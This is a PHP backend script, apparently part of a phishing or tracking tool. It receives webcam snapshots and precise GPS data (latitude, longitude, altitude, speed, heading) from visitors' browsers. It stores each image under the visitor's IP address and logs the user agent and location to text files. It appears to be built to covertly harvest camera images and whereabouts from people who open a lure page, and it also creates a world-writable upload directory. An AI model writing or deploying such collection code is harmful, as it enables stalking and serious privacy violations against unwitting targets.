<?php
header('Content-Type: text/html');

// Enable error reporting for DEBUG
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Directorio para guardar archivos
$upload_dir = '../../uploads/';
if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
    file_put_contents('../../logs/debug.log', "Created uploads directory: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
}

// DEBUG: Log all requests
file_put_contents('../../logs/debug.log', "=== NEW REQUEST ===" . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
file_put_contents('../../logs/debug.log', "POST data: " . print_r($_POST, true) . "\n", FILE_APPEND);
file_put_contents('../../logs/debug.log', "FILES data: " . print_r($_FILES, true) . "\n", FILE_APPEND);

// Procesar imagen de cámara web si está presente
if (isset($_FILES['webcamImage'])) {
    file_put_contents('../../logs/debug.log', "Webcam image detected!\n", FILE_APPEND);
    
    $image_file = $upload_dir . 'webcam_' . $_SERVER['REMOTE_ADDR'] . '_' . time() . '.jpg';
    
    if (move_uploaded_file($_FILES['webcamImage']['tmp_name'], $image_file)) {
        // Imagen guardada exitosamente
        file_put_contents('../../logs/debug.log', "Image saved: " . $image_file . "\n", FILE_APPEND);
        
        // También guardar información de la imagen
        $image_data = array(
            'ip' => $_SERVER['REMOTE_ADDR'],
            'userAgent' => $_POST['userAgent'] ?? 'Unknown',
            'timestamp' => $_POST['timestamp'] ?? date('Y-m-d H:i:s'),
            'image_path' => $image_file,
            'file_size' => filesize($image_file)
        );
        
        $image_json = json_encode($image_data);
        $f_image = fopen('../../logs/webcam_log.txt', 'a+');
        fwrite($f_image, $image_json . PHP_EOL);
        fclose($f_image);
        
        file_put_contents('../../logs/debug.log', "Image info logged: " . $image_json . "\n", FILE_APPEND);
    } else {
        file_put_contents('../../logs/debug.log', "Error moving uploaded file\n", FILE_APPEND);
        file_put_contents('../../logs/debug.log', "Upload error: " . $_FILES['webcamImage']['error'] . "\n", FILE_APPEND);
    }
}

// Procesar datos de ubicación (funcionalidad existente)
if (isset($_POST['Status'])) {
    $ok_status = $_POST['Status'];
    $lat = $_POST['Lat'];
    $lon = $_POST['Lon'];
    $acc = $_POST['Acc'];
    $alt = $_POST['Alt'];
    $dir = $_POST['Dir'];
    $spd = $_POST['Spd'];

    $data = array(
        'status' => $ok_status,
        'lat' => $lat,
        'lon' => $lon,
        'acc' => $acc,
        'alt' => $alt,
        'dir' => $dir,
        'spd' => $spd
    );

    $json_data = json_encode($data);

    $f = fopen('../../logs/result.txt', 'w+');
    fwrite($f, $json_data);
    fclose($f);
    
    file_put_contents('../../logs/debug.log', "Location data saved: " . $json_data . "\n", FILE_APPEND);
}

// Respuesta de éxito
echo 'OK';
?>
